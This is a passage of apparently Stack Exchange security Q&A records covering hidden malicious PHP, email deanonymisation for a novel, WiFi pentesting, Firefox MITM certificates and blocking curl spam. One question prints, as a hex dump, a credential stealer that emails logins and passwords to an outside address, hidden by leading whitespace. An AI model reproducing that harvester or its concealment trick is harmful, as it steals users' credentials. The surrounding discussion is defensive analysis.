<p>Finally, there are Unicode characters that can be formed from multiple Unicode code points in different ways. For example there is a code point &quot;lowercase letter e with dieresis&quot; ë and two code points &quot;lowercase letter e&quot; followed by &quot;modifier dieresis&quot; which looks exactly the same. To your programming language they might be the same and to your text editor they might be different, or the other way round.</p>
<p>In your example you just have plenty of whitespace. With some editors for programming, lots of whitespace might force code to be off your display. Without text wrapping, if your editor shows 100 characters, and I start a line with 100 space characters, the actually interesting code might be outside your window and invisible.</p>
<p>Now the good thing: All these problems are just causing malicious code to pass visual inspection. Most malicious code is never looked at by anyone, so there is only little additional risk added. Most people would never have looked at your php code at all.</p>
<p>Any automatic tools examining code should not be tricked by most of these, without any special measures, with the exception of having different Unicode code points for the same character. Any such tool should reject any invalid UTF-8, and convert any unicode characters with different representations into a normalised representation, as soon as any supposed utf-8 data comes in, and throw out the original.</p>
","4"
"268435","268435","Malicious code somehow hidden with whitespace?","<p>I recently came across a php file on a compromised website that had what appeared (in Sublime Text) to be a huge white-space gap.  When I run a diff against the original source file I can clearly see the malicious code which is snagging logins and passwords and emailing them to <em>someone</em>.</p>
<p>The malicious code can also be clearly seen using vim.</p>
<p>My assumption is that this is some kind of encoding exploit but I can't for the life of me figure out how it's being hidden and I've never seen anything like this before.</p>
<p>Is anyone familiar with this kind of hidden code exploit?  Is there a way to make it visible inside Sublime? I realize it may be difficult to say without seeing the file - I am happy to provide said file if need be.</p>
<p><strong>EDIT - Hex dump as requested:</strong></p>
<pre><code>0000000 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
*
00000c0 20 20 20 20 20 20 20 20 20 69 66 28 24 74 68 69
00000d0 73 2d 3e 75 73 65 72 2d 3e 6c 6f 67 69 6e 28 24
00000e0 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70
00000f0 6f 73 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2c
0000100 20 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d
0000110 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64 27
0000120 5d 29 29 7b 24 73 6d 61 69 6c 3d 24 5f 53 45 52
0000130 56 45 52 5b 27 48 54 54 50 5f 48 4f 53 54 27 5d
0000140 2e 24 5f 53 45 52 56 45 52 5b 27 52 45 51 55 45
0000150 53 54 5f 55 52 49 27 5d 2e 22 7c 22 2e 24 74 68
0000160 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70 6f 73
0000170 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2e 22 7c
0000180 22 2e 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74
0000190 2d 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64
00001a0 27 5d 3b 6d 61 69 6c 28 22 61 6c 74 2e 65 69 2d
00001b0 36 6f 6b 36 77 36 76 32 40 79 6f 70 6d 61 69 6c
00001c0 2e 63 6f 6d 22 2c 24 5f 53 45 52 56 45 52 5b 27
00001d0 48 54 54 50 5f 48 4f 53 54 27 5d 2c 24 73 6d 61
00001e0 69 6c 2c 22 46 72 6f 6d 3a 20 61 64 6d 69 6e 40
00001f0 66 6c 79 2e 63 6f 6d 5c 72 5c 6e 52 65 70 6c 79
0000200 2d 74 6f 3a 20 61 6c 74 2e 65 69 2d 36 6f 6b 36
0000210 77 36 76 32 40 79 6f 70 6d 61 69 6c 2e 63 6f 6d
0000220 22 29 3b
0000223
</code></pre>
","50","3","268467","<p>The code is exploiting a flaw in Sublime to prevent text from being displayed.</p>
<p>This is what part of the code looks like in Notepad++. It is obviously looking for <code>post['username']</code> and <code>post['password']</code>.</p>
<p><a href=""https://i.stack.imgur.com/qPMZa.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/qPMZa.png"" alt=""enter image description here"" /></a></p>
<p>And Notepad++ can handle even 7000 characters when word wrapping:</p>
<p><a href=""https://i.stack.imgur.com/rc0kL.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/rc0kL.png"" alt=""enter image description here"" /></a></p>
<p>The flaw is due to Sublime's incorrect word wrap behavior. The 200 leading spaces indents the text far off the screen while also disabling the horizontal scrollbar due to &quot;word wrap&quot;, but it actually isn't wrapping any of the text due to treating the 200 spaces as an indent. Zooming out or turning off word wrap would've displayed the text fine.</p>
<p><a href=""https://i.stack.imgur.com/3sZu0.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/3sZu0.png"" alt=""enter image description here"" /></a></p>
<p>Sublime has its own <a href=""https://packagecontrol.io/packages/HexViewer"" rel=""noreferrer"">HexViewer</a> and that has no problems displaying the code on the ASCII panel:</p>
<p><a href=""https://i.stack.imgur.com/JEVyb.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/JEVyb.png"" alt=""enter image description here"" /></a></p>
","62"
"268390","268390","Identify someone using a double identity by tracing phone use common to the two 'identities'?","<p>Thriller novelist here looking to get something right.</p>
<p>I have a character who uses an alias. I have two scenarios I'm trying to have play out...</p>
<p>At some point, they have sent emails from the same phone whilst using their alias and real identity accounts (using different Gmail accounts, and using a VPN, assuming that would be enough to hide their real identity).</p>
<p>The police have an email sent by the person from their real identity, and an email sent from the alias account.</p>
<p>Would there be any data in, say, email headers that could say for sure that the emails from different accounts were sent from the same phone?</p>
<p>OR</p>
<p>If the person sent an email then logged into their alias account straight away and sent an email, would there be a way for the police to determine if the emails were sent from the same location?</p>
<p>OR</p>
<p>If anyone much smarter than me can suggest a simple way that common phone use between the two identities could be revealed through either common time or location data or something.</p>
<p>I'm very much hoping there is!</p>
","9","5","268392","<p>Many Email providers including Google do following:</p>
<ul>
<li>Keep the list of the most recent logins</li>
<li>Keep the list of devices used for login</li>
<li>Have a list of apps allowed to access Email account</li>
<li>Some can save also IPs (Google displays only Country)</li>
</ul>
<p>The more factors correlate, the higher is the <em>probability</em> that the same device was used. However, unlike IMEI, these data do not uniquely identify the device.</p>
","4"
"268390","268390","Identify someone using a double identity by tracing phone use common to the two 'identities'?","<p>Thriller novelist here looking to get something right.</p>
<p>I have a character who uses an alias. I have two scenarios I'm trying to have play out...</p>
<p>At some point, they have sent emails from the same phone whilst using their alias and real identity accounts (using different Gmail accounts, and using a VPN, assuming that would be enough to hide their real identity).</p>
<p>The police have an email sent by the person from their real identity, and an email sent from the alias account.</p>
<p>Would there be any data in, say, email headers that could say for sure that the emails from different accounts were sent from the same phone?</p>
<p>OR</p>
<p>If the person sent an email then logged into their alias account straight away and sent an email, would there be a way for the police to determine if the emails were sent from the same location?</p>
<p>OR</p>
<p>If anyone much smarter than me can suggest a simple way that common phone use between the two identities could be revealed through either common time or location data or something.</p>
<p>I'm very much hoping there is!</p>
","9","5","268398","<p>Police don't need to investigate headers. They just ask for Gmail logs, &quot;What IP was logged in when this account sent this email? And what device info do you have about the connection in your logs (browser, device type, etc.)?&quot;</p>
<p>Then, in your scenario, they ask the VPN provider, &quot;What account was assigned this IP at this time that accessed Gmail? And what IP was used for the VPN connection?&quot;</p>
<p>Then they ask the ISP/mobile carrier that uses that IP, &quot;What account used that IP at this time? And what was the tower location for the connection?&quot;</p>
<p>In some places in the world, these checks can happen in a very short time.</p>
","14"
"268390","268390","Identify someone using a double identity by tracing phone use common to the two 'identities'?","<p>Thriller novelist here looking to get something right.</p>
<p>I have a character who uses an alias. I have two scenarios I'm trying to have play out...</p>
<p>At some point, they have sent emails from the same phone whilst using their alias and real identity accounts (using different Gmail accounts, and using a VPN, assuming that would be enough to hide their real identity).</p>
<p>The police have an email sent by the person from their real identity, and an email sent from the alias account.</p>
<p>Would there be any data in, say, email headers that could say for sure that the emails from different accounts were sent from the same phone?</p>
<p>OR</p>
<p>If the person sent an email then logged into their alias account straight away and sent an email, would there be a way for the police to determine if the emails were sent from the same location?</p>
<p>OR</p>
<p>If anyone much smarter than me can suggest a simple way that common phone use between the two identities could be revealed through either common time or location data or something.</p>
<p>I'm very much hoping there is!</p>
","9","5","268415","<p>Other answers have already provided alternative ways for how the sender could be deanonymized with the help of service providers. But no answer so far addressed the actual question: <strong>Can the device be inferred from the email headers alone?</strong></p>
<p>The general answer is no. When you look at <a href=""https://www.rfc-editor.org/rfc/rfc2076"" rel=""nofollow noreferrer"">the list of common internet mail headers</a>, you will see that the device the mail was generated on is not one of them. The one that is closest is the <code>Recieved:</code> header which states the IP addresses through which the email was forwarded, but when the user uses a VPN to connect to their email server, then this header would only contain the  VPN exit IP. However:</p>
<ol>
<li><p>Those are just the <em>common</em> headers. Email clients and relays are allowed to add more headers if they want to. But I don't see why an email client would risk the privacy of their users by adding an unique device identifier. And when the character in your story is tech-savvy and security-conscious, they probably would not use such an email client.</p>
</li>
<li><p>While no header alone clearly identifies a device, the combination of multiple headers and their order might be enough information to create an unique fingerprint. And when the client formats their emails not as plaintext but as HTML (which many email clients do without the users at either side being aware of it), then the way the email client generates the HTML markup can also leak information about its configuration.</p>
<p>Similar to <a href=""https://coveryourtracks.eff.org/"" rel=""nofollow noreferrer"">web browser fingerprinting</a>, the combination of enough traits can be enough to uniquely identify a specific device. So an unusual combination of headers that shows up in two emails is probably not <em>definitive</em> proof that they come from the same email client on the same device, but they could be a clue that this possibility might be worth investigating.</p>
</li>
</ol>
<p>Note that in either case, the character in your story could probably avoid being fingerprinted like that by using two different email programs for their alias identities.</p>
","6"
"268390","268390","Identify someone using a double identity by tracing phone use common to the two 'identities'?","<p>Thriller novelist here looking to get something right.</p>
<p>I have a character who uses an alias. I have two scenarios I'm trying to have play out...</p>
<p>At some point, they have sent emails from the same phone whilst using their alias and real identity accounts (using different Gmail accounts, and using a VPN, assuming that would be enough to hide their real identity).</p>
<p>The police have an email sent by the person from their real identity, and an email sent from the alias account.</p>
<p>Would there be any data in, say, email headers that could say for sure that the emails from different accounts were sent from the same phone?</p>
<p>OR</p>
<p>If the person sent an email then logged into their alias account straight away and sent an email, would there be a way for the police to determine if the emails were sent from the same location?</p>
<p>OR</p>
<p>If anyone much smarter than me can suggest a simple way that common phone use between the two identities could be revealed through either common time or location data or something.</p>
<p>I'm very much hoping there is!</p>
","9","5","268447","<p>You have mentioned the character used a VPN for hiding their identity. This can give their identity away if they are the only user of that VPN in a certain area or network. Whether they use the VPN all the time or just for the email, both scenarios could give them away.</p>
<p>Particularly so if they use public networks to access the VPN, such as their workplace or a public library. (For literary purposes, it would be easier to rogue-monitor these networks for connections to the VPN provider.)</p>
","0"
"268390","268390","Identify someone using a double identity by tracing phone use common to the two 'identities'?","<p>Thriller novelist here looking to get something right.</p>
<p>I have a character who uses an alias. I have two scenarios I'm trying to have play out...</p>
<p>At some point, they have sent emails from the same phone whilst using their alias and real identity accounts (using different Gmail accounts, and using a VPN, assuming that would be enough to hide their real identity).</p>
<p>The police have an email sent by the person from their real identity, and an email sent from the alias account.</p>
<p>Would there be any data in, say, email headers that could say for sure that the emails from different accounts were sent from the same phone?</p>
<p>OR</p>
<p>If the person sent an email then logged into their alias account straight away and sent an email, would there be a way for the police to determine if the emails were sent from the same location?</p>
<p>OR</p>
<p>If anyone much smarter than me can suggest a simple way that common phone use between the two identities could be revealed through either common time or location data or something.</p>
<p>I'm very much hoping there is!</p>
","9","5","268450","<p>VPNs have their limitations. A VPN will conceal what data you send, and where you send it. It will not conceal when you send it, nor how many bytes you sent. The same applies to what you receive.</p>
<p>To send an e-mail, it is necessary to use an internet protocol called <a href=""https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"" rel=""nofollow noreferrer"">SMTP</a> which specifies exactly what data must be sent and received.</p>
<p>If you have access to the network logs for the phone and the mobile operator, you can then observe if the phone sent a series of data packets at the right time and of the right size to create the e-mail.</p>
<p>The wikipedia page for SMTP shows an example with the phone (client) sending six messages and the e-mail content and the server sending eight messages back. There should also be a &quot;login&quot; step preceding these messages which establish the sender's identity and another layer of encryption. This takes another five or six messages back and forth.</p>
<p>So - the police can check if a specific phone could have used a VPN to send a specific e-mail. It does not prove that phone did, as those dozen-or-so messages could have been something completely different that just happened to have exactly the right number of bytes. If you have more e-mails though, the chance of it all being innocent co-incidences really declines.</p>
<p>Additionally, the e-mail company does know the e-mail came from via a specific VPN provider. The data logs for the phone will show that the phone was connected to that specific VPN.</p>
","-1"
"268286","268286","Is Wifi Penetration Testing Dead?","<p>&quot;I hack your Wifi in 5 Minutes&quot; still seems to be a hot topic on youtube in 2023, atleast on beginner channels like David Bombal. However, is there still any real world application? Even before the advent of WPA3?</p>
<p>Handshake-Capture + Password Cracking: What company hires an expensive pentester for their Wifi network and uses crackable passwords? Not even my Non-IT-Friends use crackable passwords...</p>
<p>WPS-Attacks and a multitude AP DoS Exploits: Works on hardware from the stone age...</p>
<p>KRACK &amp; FRAG: No public exploits available and even if they were.. they dont seem very dangerous.</p>
<p>Rogue APs / Evil Twins: For a long time this was supposed to be the only practical way to attack Wifi networks. But this seems to be completely useless nowadays aswell. Not even Deauth attacks work on halfway modern hardware. Even cheap consumer grade Routers/APs you get for &quot;free&quot; from your ISP are resistant to deauth attacks. And that is WITHOUT PMF.. Sometimes i can deauth some old/cheap devices but my Samsung S22 Ultra or my updated Windows 10 Machine never gets disconnected. Airepleay Broadcast, Airepleay Targeted, MDK3, MDK4, Scapy etc. nothing works here. And yes, i triple checked interface channel, mode, airmon kill etc. I also tried 4 different modern Adapters which all support 5 GHz 802.11ac. I even ran them in parallel and deauthed 2.4Ghz channels and 5Ghz at the same time. I also used airgeddons DoS Pursuit Mode, even tho the APs didnt channel hop to evade the attack. On my Routers/APs from 2010 i can deauth all devices all day long, but not on any modern hardware.
And even if i can reliably disconnect clients, none of them are are still dumb enough to immediately switch to an open Access Point with the same SSID... so you could try some Mana Attack variant and hope to find an open Wifi in the clients PNL and let him connect.. and then phish them while they are connected to &quot;Starbucks Free Wifi&quot; while sitting at work :-D.</p>
<p>Am i missing something here? I would rather sell my clients the 10th Network Pentest/Phishing Training Campaign/Physical Assessment than a Wifi Pentest.</p>
","0","4","268292","<p><strong>Yes and No.</strong></p>
<p>What makes Wi-Fi testing &quot;dead&quot; is the fact that a lot of mitigations were included in consumer-grade access points. The default setting in <em>most</em> access points is a random SSID (to prevent pre-computation), WPA2-AES, WPS disabled or requiring physical interaction and a reasonably secure default password. And on the enterprise side, we have WPA2 Enterprise using client certificates for access, which is currently uncrackable.</p>
<p>This is a good thing! I know, as testers we get frustrated when our attacks are fruitless, but I remember a time in which there were three APs named &quot;linksys&quot; in my street, all of which unprotected. And the rest used WEP, which was almost as bad. Again, let me empasize that the fact that the average access point can't be pwn'd in 5 minutes anymore is good.</p>
<hr />
<p>That said, not every access point is uo-to-date. Access points are the kind of infrastructure, which no one really cares about, as long as they work. Like, when was the last time you consciously thought about the plumbing in your home? As long as it works, it just keeps working and no one pays attention to it.</p>
<p>This is especially true in large companies, and doubly especially if these companies need to provide access to legacy devices, some of which are old enough to not even support WPA.</p>
<p>In this case, your task as a pentester is to identify these legacy devices, attack them if possible, demonstrate the vulnerabilities and see what access this would give to an attacker.</p>
<p>For example, a WEP access point, which gives access to 5 legacy devices used for scanning parcels in a warehouse, and one server used to receive the scans, is not as valuable as that same access point giving access to the entire network.</p>
<p>In other words: Your job as penetration tester is not to wow the customer and demonstrate how broken everything is, but to accurately assess risks and suggest mitigation measures for them.</p>
","2"
"268286","268286","Is Wifi Penetration Testing Dead?","<p>&quot;I hack your Wifi in 5 Minutes&quot; still seems to be a hot topic on youtube in 2023, atleast on beginner channels like David Bombal. However, is there still any real world application? Even before the advent of WPA3?</p>
<p>Handshake-Capture + Password Cracking: What company hires an expensive pentester for their Wifi network and uses crackable passwords? Not even my Non-IT-Friends use crackable passwords...</p>
<p>WPS-Attacks and a multitude AP DoS Exploits: Works on hardware from the stone age...</p>
<p>KRACK &amp; FRAG: No public exploits available and even if they were.. they dont seem very dangerous.</p>
<p>Rogue APs / Evil Twins: For a long time this was supposed to be the only practical way to attack Wifi networks. But this seems to be completely useless nowadays aswell. Not even Deauth attacks work on halfway modern hardware. Even cheap consumer grade Routers/APs you get for &quot;free&quot; from your ISP are resistant to deauth attacks. And that is WITHOUT PMF.. Sometimes i can deauth some old/cheap devices but my Samsung S22 Ultra or my updated Windows 10 Machine never gets disconnected. Airepleay Broadcast, Airepleay Targeted, MDK3, MDK4, Scapy etc. nothing works here. And yes, i triple checked interface channel, mode, airmon kill etc. I also tried 4 different modern Adapters which all support 5 GHz 802.11ac. I even ran them in parallel and deauthed 2.4Ghz channels and 5Ghz at the same time. I also used airgeddons DoS Pursuit Mode, even tho the APs didnt channel hop to evade the attack. On my Routers/APs from 2010 i can deauth all devices all day long, but not on any modern hardware.
And even if i can reliably disconnect clients, none of them are are still dumb enough to immediately switch to an open Access Point with the same SSID... so you could try some Mana Attack variant and hope to find an open Wifi in the clients PNL and let him connect.. and then phish them while they are connected to &quot;Starbucks Free Wifi&quot; while sitting at work :-D.</p>
<p>Am i missing something here? I would rather sell my clients the 10th Network Pentest/Phishing Training Campaign/Physical Assessment than a Wifi Pentest.</p>
","0","4","268364","<p>It's not dead, just a waste of energy to care about for most. Enterprise wi-fi and a hack inbound is a big risk, but unless your network team is incompetent, a very high bar. Still worth at least auditing though.</p>
<p>For consumer wi-fi, just being used as a way out to the internet, this is no big deal. Nearly everything uses TLS now, and the internet itself is a cesspool. Russian or N Korean hackers aren't gonna war drive your house.</p>
","0"
"268286","268286","Is Wifi Penetration Testing Dead?","<p>&quot;I hack your Wifi in 5 Minutes&quot; still seems to be a hot topic on youtube in 2023, atleast on beginner channels like David Bombal. However, is there still any real world application? Even before the advent of WPA3?</p>
<p>Handshake-Capture + Password Cracking: What company hires an expensive pentester for their Wifi network and uses crackable passwords? Not even my Non-IT-Friends use crackable passwords...</p>
<p>WPS-Attacks and a multitude AP DoS Exploits: Works on hardware from the stone age...</p>
<p>KRACK &amp; FRAG: No public exploits available and even if they were.. they dont seem very dangerous.</p>
<p>Rogue APs / Evil Twins: For a long time this was supposed to be the only practical way to attack Wifi networks. But this seems to be completely useless nowadays aswell. Not even Deauth attacks work on halfway modern hardware. Even cheap consumer grade Routers/APs you get for &quot;free&quot; from your ISP are resistant to deauth attacks. And that is WITHOUT PMF.. Sometimes i can deauth some old/cheap devices but my Samsung S22 Ultra or my updated Windows 10 Machine never gets disconnected. Airepleay Broadcast, Airepleay Targeted, MDK3, MDK4, Scapy etc. nothing works here. And yes, i triple checked interface channel, mode, airmon kill etc. I also tried 4 different modern Adapters which all support 5 GHz 802.11ac. I even ran them in parallel and deauthed 2.4Ghz channels and 5Ghz at the same time. I also used airgeddons DoS Pursuit Mode, even tho the APs didnt channel hop to evade the attack. On my Routers/APs from 2010 i can deauth all devices all day long, but not on any modern hardware.
And even if i can reliably disconnect clients, none of them are are still dumb enough to immediately switch to an open Access Point with the same SSID... so you could try some Mana Attack variant and hope to find an open Wifi in the clients PNL and let him connect.. and then phish them while they are connected to &quot;Starbucks Free Wifi&quot; while sitting at work :-D.</p>
<p>Am i missing something here? I would rather sell my clients the 10th Network Pentest/Phishing Training Campaign/Physical Assessment than a Wifi Pentest.</p>
","0","4","268377","<p>I would like to focus on this point:</p>
<blockquote>
<p>What company hires an expensive pentester for their Wifi network and uses crackable passwords?</p>
</blockquote>
<p>Theoretically, a company would only hire an expensive pentester after they have configured everything correctly. In which case, why would they need a pentester? Pentesters of big, reputable companies, don't only find extremely subtle weaknesses that are unlikely to prevent.</p>
<p>It's hard to find (publicly) what kind of vulnerabilities pentesters <em>are</em> finding on their clients. But you can sometimes learn about vulnerabilities that were <em>not</em> found¹ and resulted in a big incident.</p>
<p>These include trivial things like hardcoded passwords, privileged endpoints that don't require authentication, outdated software with well-known critical vulnerabilities…</p>
<p>In the realm of passwords, you could find secure passwords created randomly that are not vulnerable to cracking, but also default passwords, initial ones that were never changed, passwords chosen by the users that are very weak, credential reuse…</p>
<p>So I wouldn't be surprised that such pentester could crack a number of passwords. In fact, a big part of the move to MFA lies on not trusting the users to choose and keep safe proper, unique, passwords. Why should those used for Wifi any different?</p>
<p>And that's basically the point of penetration testing: letting someone else to discover that what you built wasn't really as secure as you thought.</p>
<p>¹ Probably because there was no pentesting</p>
","0"
"268286","268286","Is Wifi Penetration Testing Dead?","<p>&quot;I hack your Wifi in 5 Minutes&quot; still seems to be a hot topic on youtube in 2023, atleast on beginner channels like David Bombal. However, is there still any real world application? Even before the advent of WPA3?</p>
<p>Handshake-Capture + Password Cracking: What company hires an expensive pentester for their Wifi network and uses crackable passwords? Not even my Non-IT-Friends use crackable passwords...</p>
<p>WPS-Attacks and a multitude AP DoS Exploits: Works on hardware from the stone age...</p>
<p>KRACK &amp; FRAG: No public exploits available and even if they were.. they dont seem very dangerous.</p>
<p>Rogue APs / Evil Twins: For a long time this was supposed to be the only practical way to attack Wifi networks. But this seems to be completely useless nowadays aswell. Not even Deauth attacks work on halfway modern hardware. Even cheap consumer grade Routers/APs you get for &quot;free&quot; from your ISP are resistant to deauth attacks. And that is WITHOUT PMF.. Sometimes i can deauth some old/cheap devices but my Samsung S22 Ultra or my updated Windows 10 Machine never gets disconnected. Airepleay Broadcast, Airepleay Targeted, MDK3, MDK4, Scapy etc. nothing works here. And yes, i triple checked interface channel, mode, airmon kill etc. I also tried 4 different modern Adapters which all support 5 GHz 802.11ac. I even ran them in parallel and deauthed 2.4Ghz channels and 5Ghz at the same time. I also used airgeddons DoS Pursuit Mode, even tho the APs didnt channel hop to evade the attack. On my Routers/APs from 2010 i can deauth all devices all day long, but not on any modern hardware.
And even if i can reliably disconnect clients, none of them are are still dumb enough to immediately switch to an open Access Point with the same SSID... so you could try some Mana Attack variant and hope to find an open Wifi in the clients PNL and let him connect.. and then phish them while they are connected to &quot;Starbucks Free Wifi&quot; while sitting at work :-D.</p>
<p>Am i missing something here? I would rather sell my clients the 10th Network Pentest/Phishing Training Campaign/Physical Assessment than a Wifi Pentest.</p>
","0","4","268383","<p>It's not dead, it just moved to a different layer (Wifi RCE, Baseband Attacks):</p>
<p><strong>Linux Kernel Wifi RCE:</strong></p>
<p><a href=""https://lwn.net/ml/oss-security/20221013101046.GB20615@suse.de/"" rel=""nofollow noreferrer"">https://lwn.net/ml/oss-security/20221013101046.GB20615@suse.de/</a></p>
<p>&quot;CVE-2022-41674: fix u8 overflow in cfg80211_update_notlisted_nontrans
(max 256 byte overwrite) (RCE)
...&quot;</p>
<p><strong>Wifi attack against Android or iOS devices with Broadcom chipset aka Broadpwn (CVE-2017-9417):</strong></p>
<p><a href=""https://blog.exodusintel.com/2017/07/26/broadpwn/"" rel=""nofollow noreferrer"">https://blog.exodusintel.com/2017/07/26/broadpwn/</a></p>
<p><strong>Wifi RCE against iOS devices (cve-2021-30800):</strong></p>
<p><a href=""https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/"" rel=""nofollow noreferrer"">https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/</a></p>
<p>These attacks don't require any authentication/password cracking and give a high level of privilege.</p>
","0"
"268248","268248","How to make Firefox warn about unknown certificate issuer?","<p>Assume a corporate computer that has intrinsic software installed. It's a mitm setup that replaces the web page's certificate to one signed with a intrinsic software vendor's certificate that is trusted by the system and thus is trusted by web browsers.</p>
<p>But Firefox is able to tell if the certificate is signed by a trusted issuer or not but it does not warn the user, one must click the lock icon next to the address to get to know that.</p>
<p>How can I make Firefox scream that the issuer is not recognized by Firefox (yet still trusted due to its presence in OS)?</p>
","0","3","268251","<p>Mozilla considers root CA certificates as very important, wants to be able to to set policies and take actions. See <a href=""https://blog.mozilla.org/security/2019/02/14/why-does-mozilla-maintain-our-own-root-certificate-store/"" rel=""nofollow noreferrer"">Why Does Mozilla Maintain Our Own Root Certificate Store?</a>:</p>
<blockquote>
<p>“root” certificates that we use as “<a href=""https://en.wikipedia.org/wiki/Trust_anchor"" rel=""nofollow noreferrer"">trust anchors</a>” ... Despite the effort involved, Mozilla is committed to maintaining our own root store because doing so is vital to the security of our products and the web in general. It gives us the ability to set policies, determine which CAs meet them, and to take action when a CA fails to do so.</p>
</blockquote>
<p>That's why it maintains its own Root Certificate Store.</p>
<p>See further details here:</p>
<ul>
<li><a href=""https://wiki.mozilla.org/CA"" rel=""nofollow noreferrer"">Mozilla's CA Certificate Program</a></li>
<li><a href=""https://www.mozilla.org/en-US/about/governance/policies/security-group/certs/policy/"" rel=""nofollow noreferrer"">Mozilla Root Store Policy</a></li>
</ul>
<p>Mozilla maintains an own certificate store since some years. Recently also Chromium has decided to do that. See <a href=""https://blog.chromium.org/2022/09/announcing-launch-of-chrome-root-program.html"" rel=""nofollow noreferrer"">Announcing the Launch of the Chrome Root Program</a>.</p>
","0"
"268248","268248","How to make Firefox warn about unknown certificate issuer?","<p>Assume a corporate computer that has intrinsic software installed. It's a mitm setup that replaces the web page's certificate to one signed with a intrinsic software vendor's certificate that is trusted by the system and thus is trusted by web browsers.</p>
<p>But Firefox is able to tell if the certificate is signed by a trusted issuer or not but it does not warn the user, one must click the lock icon next to the address to get to know that.</p>
<p>How can I make Firefox scream that the issuer is not recognized by Firefox (yet still trusted due to its presence in OS)?</p>
","0","3","268260","<p>Firefox doesn't distinguish between built-in certificates and user-installed ones. You get no warning, period.</p>
<p>If you want this feature in the browser you could consider two options 1) opening a feature request at their <a href=""https://bugzilla.mozilla.org/"" rel=""nofollow noreferrer"">bugzilla</a> 2) writing a patch and compiling your own version of Firefox which does precisely that.</p>
","0"
"268248","268248","How to make Firefox warn about unknown certificate issuer?","<p>Assume a corporate computer that has intrinsic software installed. It's a mitm setup that replaces the web page's certificate to one signed with a intrinsic software vendor's certificate that is trusted by the system and thus is trusted by web browsers.</p>
<p>But Firefox is able to tell if the certificate is signed by a trusted issuer or not but it does not warn the user, one must click the lock icon next to the address to get to know that.</p>
<p>How can I make Firefox scream that the issuer is not recognized by Firefox (yet still trusted due to its presence in OS)?</p>
","0","3","268999","<p>Firefox settings → Privacy &amp; Security → View certificates → Authorities</p>
<p>Select the vendor CA used by the mitm solution and press &quot;Delete or Distrust&quot; button</p>
<p>I expect this will do the RIght Thing™ for certificates that were automatically imported from the system trust store. In case it reimports them s trusted (thus defeating your disabling), you may need to change in about:config the value security.enterprise_roots.enabled to false (and delete them again). You should do some tests, restarting Firefox inbetween.</p>
<p>Note that if the network is configured to intercept everything, you will get a certificate error for every https page, since it will be mitm every website.</p>
","0"
"268202","268202","How to block a POST curl request","<p>My WordPress website received a couple of fake subscriptions to the newsletter. I identified the logs, most of them with the same form as below:</p>
<pre><code>xx.xx.xx.xx example.com - [04/Feb/2023:06:01:42 +0100] &quot;POST / HTTP/1.1&quot; 200 207 &quot;https://example.com/&quot; &quot;curl/7.54.0&quot;
</code></pre>
<p>Is there any way to block this?</p>
<ul>
<li>Could I do that through htaccess?</li>
<li>And how?</li>
<li>Or by inserting a PHP script in my WordPress header?</li>
</ul>
","1","3","268203","<p>The log record that you posted shows that these requests are being sent with <code>curl/7.54.0</code> as the user agent string in the headers of these requests.</p>
<p>In PHP, you can use the <code>$_SERVER['HTTP_USER_AGENT']</code> environment variable to access the user agent string sent by the client in the request headers.  So, you can insert a simple <code>if</code> statement in your PHP script to check the user agent string, and exit if it sees a request with a user agent string that you deem to be unauthorized.</p>
<p>But, bear in mind that the user agent string is set by the client (see the -A option with curl).  Therefore, a determined client can circumvent your check by spoofing a user agent string that you authorize (such as <code>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0</code>), and continue to make these automated requests to your site.</p>
","2"
"268202","268202","How to block a POST curl request","<p>My WordPress website received a couple of fake subscriptions to the newsletter. I identified the logs, most of them with the same form as below:</p>
<pre><code>xx.xx.xx.xx example.com - [04/Feb/2023:06:01:42 +0100] &quot;POST / HTTP/1.1&quot; 200 207 &quot;https://example.com/&quot; &quot;curl/7.54.0&quot;
</code></pre>
<p>Is there any way to block this?</p>
<ul>
<li>Could I do that through htaccess?</li>
<li>And how?</li>
<li>Or by inserting a PHP script in my WordPress header?</li>
</ul>
","1","3","268207","<p>You can block the cURL request in two ways one using .htacess and another one from your codebase, Check the below .htaccess configuration:</p>
<pre><code>RewriteEngine On
RewriteCond %{REQUEST_METHOD} POST
RewriteCond %{HTTP_USER_AGENT} ^curl [NC]
RewriteRule .* - [R=403,L]
</code></pre>
<p>The second way is to use <code>REQUEST_METHOD</code> and <code>HTTP_USER_AGENT</code> in your codebase:</p>
<pre><code>&lt;?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; strpos($_SERVER['HTTP_USER_AGENT'], 'curl') !== false) {
  header('HTTP/1.0 403 Forbidden');
  exit;
}
?&gt;
</code></pre>
<p>If the request gets blocked and the attacker intends to attack more they might change the user agent to bypass this configuration: <a href=""https://reqbin.com/req/c-ekublyqq/curl-user-agent#:%7E:text=Setting%20the%20User%2DAgent%20for,number%22."" rel=""nofollow noreferrer"">ref</a></p>
<p>To mitigate this issue, you might add a rate limit on your newsletter if you are getting too many requests at a time ( not sure you didn't mention it ).</p>
","2"
"268202","268202","How to block a POST curl request","<p>My WordPress website received a couple of fake subscriptions to the newsletter. I identified the logs, most of them with the same form as below:</p>
<pre><code>xx.xx.xx.xx example.com - [04/Feb/2023:06:01:42 +0100] &quot;POST / HTTP/1.1&quot; 200 207 &quot;https://example.com/&quot; &quot;curl/7.54.0&quot;
</code></pre>
<p>Is there any way to block this?</p>
<ul>
<li>Could I do that through htaccess?</li>
<li>And how?</li>
<li>Or by inserting a PHP script in my WordPress header?</li>
</ul>
","1","3","268227","<p>Do not trust the <code>User-Agent</code> header; the circumvention is as easy as the protection. Even with cURL it is possible to change the header with a single command line option.</p>
<pre><code>curl -A &quot;Mozilla/5.0 (...) ...&quot;
